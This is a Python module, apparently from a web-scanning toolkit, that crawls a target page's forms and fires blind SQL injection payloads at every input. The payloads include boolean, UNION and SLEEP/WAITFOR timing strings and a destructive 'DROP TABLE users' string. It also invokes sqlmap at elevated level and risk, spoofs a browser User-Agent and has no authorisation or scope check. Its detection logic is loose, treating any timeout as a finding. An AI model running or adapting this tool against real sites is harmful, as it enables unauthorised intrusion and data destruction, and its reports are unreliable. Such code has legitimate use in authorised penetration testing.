import requests
import subprocess
import logging
import os
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from colorama import Fore
from typing import List, Dict, Optional, Tuple

# Set up logging for errors only
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

class BlindSQLiScanner:
    """Advanced Blind SQL Injection scanner with improved detection and safety."""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # SQL injection test payloads for basic detection
        self.test_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
            "1\" AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
        ]
        
        # Time-based detection patterns
        self.time_based_payloads = [
            "1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS x WHERE SLEEP(3))--",
            "1\" AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS x WHERE SLEEP(3))--",
            "'; WAITFOR DELAY '00:00:03'--",
            "1' OR SLEEP(3)--",
            "1\" OR SLEEP(3)--",
        ]
        
    def is_valid_url(self, url: str) -> bool:
        """Validate URL format."""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False
    
    def extract_forms(self, url: str) -> List[BeautifulSoup]:
        """
        Extract forms from HTML page with proper error handling.
        
        Args:
            url: Target URL to extract forms from
            
        Returns:
            List of BeautifulSoup form objects
        """
        forms = []
        
        try:
            response = self.session.get(url, timeout=15)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.content, "html.parser")
            forms = soup.find_all("form")
            
        except requests.exceptions.RequestException as e:
            logger.error(f"Error extracting forms from {url}: {str(e)}")
        except Exception as e:
            logger.error(f"Unexpected error extracting forms: {str(e)}")
        
        return forms
    
    def get_form_details(self, form: BeautifulSoup) -> Optional[Dict]:
        """
        Extract form details with improved error handling.
        
        Args:
            form: BeautifulSoup form object
            
        Returns:
            Dictionary with form details or None if extraction fails
        """
        try:
            details = {
                "action": form.attrs.get("action", "").lower(),
                "method": form.attrs.get("method", "get").lower(),
                "inputs": []
            }
            
            # Extract input fields
            for input_tag in form.find_all(["input", "textarea", "select"]):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                
                if input_name and input_type not in ["submit", "button", "reset", "file"]:
                    details["inputs"].append({
                        "type": input_type,
                        "name": input_name,
                        "value": input_tag.attrs.get("value", "")
                    })
            
            # Only return if we have testable inputs
            if details["inputs"]:
                return details
                
        except Exception as e:
            logger.error(f"Error getting form details: {str(e)}")
        
        return None
    
    def test_time_based_sqli(self, url: str, param_name: str, method: str = "GET", post_data: Optional[Dict] = None) -> bool:
        """
        Test for time-based SQL injection vulnerabilities.
        
        Args:
            url: Target URL
            param_name: Parameter name to test
            method: HTTP method (GET/POST)
            post_data: POST data dictionary if applicable
            
        Returns:
            True if time-based SQLi detected, False otherwise
        """
        for payload in self.time_based_payloads:
            try:
                # Record baseline response time
                start_time = time.time()
                
                if method.upper() == "POST" and post_data:
                    test_data = post_data.copy()
                    test_data[param_name] = payload
                    
                    response = self.session.post(url, data=test_data, timeout=15)
                else:
                    # GET request with payload in URL parameter
                    params = {param_name: payload}
                    response = self.session.get(url, params=params, timeout=15)
                
                end_time = time.time()
                response_time = end_time - start_time
                
                # If response takes significantly longer (indicating SLEEP/WAITFOR worked)
                if response_time >= 2.5:  # Allow some tolerance
                    return True
                    
            except requests.exceptions.Timeout:
                # Timeout might indicate successful time-based injection
                return True
            except Exception as e:
                logger.error(f"Error testing time-based SQLi: {str(e)}")
                continue
        
        return False
    
    def run_sqlmap_test(self, url: str, form_details: Dict, input_field: Dict) -> bool:
        """
        Run SQLMap for comprehensive SQL injection testing.
        
        Args:
            url: Target URL
            form_details: Form details dictionary
            input_field: Input field details
            
        Returns:
            True if SQLMap detects vulnerability, False otherwise
        """
        try:
            # Check if sqlmap is available
            result = subprocess.run(["which", "sqlmap"], capture_output=True, text=True)
            if result.returncode != 0:
                # SQLMap not found, skip this test
                return False
            
            # Construct SQLMap command safely
            target_url = urljoin(url, form_details["action"]) if form_details["action"] else url
            
            cmd = [
                "sqlmap",
                "-u", target_url,
                f"--method={form_details['method'].upper()}",
                "-p", input_field["name"],
                "--batch",
                "--level=3",
                "--risk=2",
                "--timeout=10",
                "--retries=1",
                "--skip-urlencode",
                "--technique=B",  # Focus on blind techniques
                "--threads=3"
            ]
            
            # Add POST data if needed
            if form_details["method"].lower() == "post":
                post_data_parts = []
                for inp in form_details["inputs"]:
                    value = inp.get("value", "test") if inp["name"] != input_field["name"] else "*"
                    post_data_parts.append(f"{inp['name']}={value}")
                
                post_data = "&".join(post_data_parts)
                cmd.extend(["--data", post_data])
            
            # Run SQLMap with timeout
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60,  # 60 second timeout
                cwd=os.getcwd()
            )
            
            # Check output for vulnerability indicators
            output = process.stdout.lower()
            
            vulnerability_indicators = [
                "sqlmap identified the following injection points",
                "parameter appears to be vulnerable",
                "blind sql injection vulnerability",
                "time-based blind sql injection",
                "boolean-based blind sql injection"
            ]
            
            for indicator in vulnerability_indicators:
                if indicator in output:
                    return True
            
            return False
            
        except subprocess.TimeoutExpired:
            logger.error("SQLMap test timed out")
            return False
        except FileNotFoundError:
            # SQLMap not installed
            return False
        except Exception as e:
            logger.error(f"Error running SQLMap: {str(e)}")
            return False
    
    def save_results(self, vulnerabilities: List[Tuple[str, str, str, str]]) -> None:
        """Save blind SQL injection results to file."""
        if not vulnerabilities:
            return
        
        try:
            os.makedirs("output", exist_ok=True)
            
            with open("output/blind_sqli.txt", "w", encoding='utf-8') as f:
                f.write("=== Blind SQL Injection Vulnerability Report ===\n\n")
                f.write(f"Total vulnerabilities found: {len(vulnerabilities)}\n\n")
                
                for i, (url, method, param, detection_method) in enumerate(vulnerabilities, 1):
                    f.write(f"--- Vulnerability #{i} ---\n")
                    f.write(f"URL: {url}\n")
                    f.write(f"Method: {method}\n")
                    f.write(f"Parameter: {param}\n")
                    f.write(f"Detection Method: {detection_method}\n")
                    f.write("\n" + "="*50 + "\n\n")
                    
        except Exception as e:
            logger.error(f"Error saving results: {str(e)}")

def main(url: str) -> None:
    """
    Main blind SQL injection scanning function.
    
    Args:
        url: Target URL to scan for blind SQL injection vulnerabilities
    """
    if not url or not url.strip():
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error: URL cannot be empty")
        return
    
    scanner = BlindSQLiScanner()
    
    # Validate URL
    if not scanner.is_valid_url(url):
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error: Invalid URL format")
        return
    
    try:
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Starting Blind SQL Injection scan for: {Fore.GREEN}{url}")
        
        # Extract forms from the page
        forms = scanner.extract_forms(url)
        
        if not forms:
            print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No forms found on the target page")
            return
        
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Found {len(forms)} form(s) to test")
        
        vulnerabilities = []
        
        # Test each form for SQL injection
        for i, form in enumerate(forms, 1):
            form_details = scanner.get_form_details(form)
            
            if not form_details:
                continue
            
            print(f"{Fore.CYAN}[*] Testing form {i}/{len(forms)}")
            
            # Test each input field
            for input_field in form_details["inputs"]:
                param_name = input_field["name"]
                
                print(f"{Fore.CYAN}[*] Testing parameter: {param_name}")
                
                target_url = urljoin(url, form_details["action"]) if form_details["action"] else url
                
                # Test 1: Time-based detection
                post_data = None
                if form_details["method"].lower() == "post":
                    post_data = {inp["name"]: inp.get("value", "test") for inp in form_details["inputs"]}
                
                if scanner.test_time_based_sqli(target_url, param_name, form_details["method"], post_data):
                    vulnerabilities.append((target_url, form_details["method"].upper(), param_name, "Time-based detection"))
                    print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Time-based Blind SQLi detected in parameter: {Fore.RED}{param_name}")
                
                # Test 2: SQLMap comprehensive test (if available)
                if scanner.run_sqlmap_test(url, form_details, input_field):
                    vulnerabilities.append((target_url, form_details["method"].upper(), param_name, "SQLMap detection"))
                    print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} SQLMap confirmed Blind SQLi in parameter: {Fore.RED}{param_name}")
                
                # Rate limiting
                time.sleep(1)
        
        # Report results
        if vulnerabilities:
            unique_vulns = len(set((v[0], v[2]) for v in vulnerabilities))  # Unique by URL and parameter
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Blind SQLi Found: {Fore.RED}{len(vulnerabilities)} total, {unique_vulns} unique")
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Blind SQLi Report: {Fore.GREEN}Saved to /output/blind_sqli.txt")
            
            # Save results
            scanner.save_results(vulnerabilities)
        else:
            print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No Blind SQL Injection vulnerabilities found")
        
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Request timed out")
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Connection error - check URL and network")
    except requests.exceptions.HTTPError as e:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} HTTP error: {e.response.status_code}")
    except Exception as e:
        logger.error(f"Blind SQLi scan error: {str(e)}")
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error during Blind SQLi scan: {str(e)}")
    finally:
        # Clean up session
        scanner.session.close()

# For backward compatibility
def scan(url: str) -> None:
    """Wrapper function for backward compatibility."""
    main(url)